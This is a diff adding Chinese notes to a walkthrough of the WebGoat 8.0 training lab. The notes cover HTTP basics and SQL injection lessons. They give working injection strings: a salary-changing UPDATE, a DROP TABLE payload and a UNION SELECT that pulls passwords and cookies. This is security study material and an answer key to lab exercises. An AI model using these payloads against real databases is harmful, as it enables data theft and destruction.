@@ -163,9 +163,52 @@ docker-compose:定义和运行多容器 Docker 应用程序的工具。通过 Co
 攻击后看到返回的VIP客户结果,刷新网页，选一个填入，过关。
 ![](images/overflowresult.jpg)
 ### WebGoat8.0漏洞利用
+[webgoat8攻略](http://www.xianxianlabs.com/2018/06/03/webgoat1/#i)  
 注册---登录
 ### 一、General
 #### 1.HTTP Basics
+在第二个表单页面，伪造一个身份发送得到magic_num为98
+![](images/web8-httpbasic.png)
+### 二、Injection Flaws
+#### 1.SQL Injection(introduction)
+[sql复习网址](http://www.sqlcourse.com/update.html)
+```
+#2  
+select * from employees where last_name='Franco'; 
+#3 
+update employees set department='Sales' where last_name='Barnett';  
+#4
+alter table employees add phone varchar(20);
+#5  
+grant alter table to Unauthorized User;
+```
+#6+7+8中学到的注入模板
+![](images/web8-sql_introduction.png)
+#9
+![](images/web8-sql_introduction1.png)
+#10
+![](images/web8-sql_introduction2.png)
+#11
+![](images/web8-sql_introduction3.png)
+#12:更新自己的薪资
+```
+#'Emlpoyee Name'框中输入
+update employees set salary = 1000000000 where last_name='Smith' --
+```
+![](images/web8-sql_introduction4.png)
+#13
+``` ';drop table access_log -- ```
+#### 2.SQL Injection(advanced)
+[课程学习](http://www.sqlcourse2.com/)  
+#3
+![](images/web8-sql_introduction5.png)
+```'  union select userid,user_name,password,cookie,'5','6','7' from user_system_data --```
 
 
+#### 4.XXE
+### 三、Authentication Flaws
+#### 1.Secure Passwords
+输入足够强度的密码，过关。
+#### 2.Password reset
 
+#### 3.Authentication Bypasses
